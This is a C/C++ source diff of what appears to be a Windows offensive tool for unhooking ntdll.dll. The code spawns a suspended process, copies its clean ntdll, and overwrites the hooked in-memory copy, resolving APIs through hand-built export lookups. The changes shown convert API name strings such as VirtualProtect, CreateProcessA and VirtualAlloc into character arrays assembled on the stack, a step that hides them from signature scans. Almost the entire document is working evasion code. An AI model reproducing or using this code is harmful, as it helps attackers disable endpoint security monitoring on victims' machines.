@@ -164,7 +164,8 @@ DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
     UINT64 kernel32dll;
     kernel32dll = GetKernel32();
     DWORD oldprotect;
-    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetSymbolAddress((HANDLE)kernel32dll, "VirtualProtect");
+    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
+    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
     VirtualProtect_p(textBase, size, flProtect, &oldprotect);
     return oldprotect;
 }
@@ -173,8 +174,8 @@ void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIREC
 {
     UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
     kernel32dll = GetKernel32();
-    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
-    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
+    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};
+    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00};
 
     LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
     msvcrtdll = (UINT64) ((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
@@ -208,14 +209,14 @@ void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER 
 {
     UINT64 kernel32dll = GetKernel32();
     UINT64 msvcrtdll, wprintfFunc, LoadLibraryAFunc;
-    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
+    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};
     LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
-    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
+    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00};
     msvcrtdll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
-    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0};
+    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00};
     wprintfFunc = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
 
-    WCHAR ErrorMessage[] =  { L'E', L'r', L'r', L'r', L'o', L'r', 0 };
+    WCHAR ErrorMessage[] =  { L'E', L'r', L'r', L'r', L'o', L'r', 0x00 };
 
     PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
 
@@ -244,18 +245,19 @@ extern "C" void exec(){
     UINT64 kernel32dll = GetKernel32();
     UINT64 msvcrtdll, wprintfFunc, LoadLibraryAFunc;
 
-    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
+    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};
     LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
 
-    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
+    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00};
     msvcrtdll = (UINT64) ((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
-    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0};
+    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00};
     wprintfFunc = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
 
-    CHAR ntdll_c[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0 };
+    CHAR ntdll_c[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x00 };
     HMODULE ntdlldll = (HMODULE)((LOADLIBRARYA)LoadLibraryAFunc)(ntdll_c);
 
-    CreateProcessA_t CreateProcessA_p = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, "CreateProcessA");
+    CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
+    CreateProcessA_t CreateProcessA_p = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
 
     WCHAR aboutMe[] = { L'W', L'r', L'i', L't', L't', L'e', L'n', L' ', L'B', L'y', L' ', L'M', L'a', L'o', L'r',  L'\n', 0x00 };
     ((WPRINTF)wprintfFunc)(aboutMe);
@@ -279,15 +281,13 @@ extern "C" void exec(){
     HANDLE hProcess = pi.hProcess;
     WCHAR PID_CHAR[] = { L'P', L'I', L'D', L' ', L':', L' ', L'%', L'd', L'\n', 0x00 };
     ((WPRINTF)wprintfFunc)(PID_CHAR, pi.dwProcessId);
-    // printf("PID : %d\n", pi->dwProcessId);
-    // getchar();
+
     WCHAR findname[] = L"ntdll.dll\x00";
 
 
     PVOID ntdllBase = GetDll(findname);
     WCHAR NTbaseAddress[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L' ', L'b', L'a', L's', L'e', L' ', L'a', L'd', L'd', L'r', L'e', L's', L's', L' ', L':', L' ', L'0', L'x', L'%', L'p', L'\n', 0x00 };
     ((WPRINTF)wprintfFunc)(NTbaseAddress, ntdllBase);
-    // printf("ntdll.dll base address : 0x%p\n", ntdllBase);
 
     //Read the ntdll.dll from the remote suspended process
     PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
@@ -297,7 +297,8 @@ extern "C" void exec(){
 
     DWORD ntdllSize = OptHeader.SizeOfImage;
 
-    VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t)GetSymbolAddress((HANDLE)kernel32dll, "VirtualAlloc");
+    CHAR VirtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x00 };
+    VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t)GetSymbolAddress((HANDLE)kernel32dll, VirtualAlloc_c);
 
     LPVOID freshNtdll = VirtualAlloc_p(NULL, ntdllSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD bytesread = NULL;
@@ -319,7 +320,7 @@ extern "C" void exec(){
     ((WPRINTF)wprintfFunc)(terminateProcessChar);
     // printf("Terminating suspended process \n");
     
-    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0};
+    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
     TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
 
     TerminateProcessFunc(hProcess, 0);
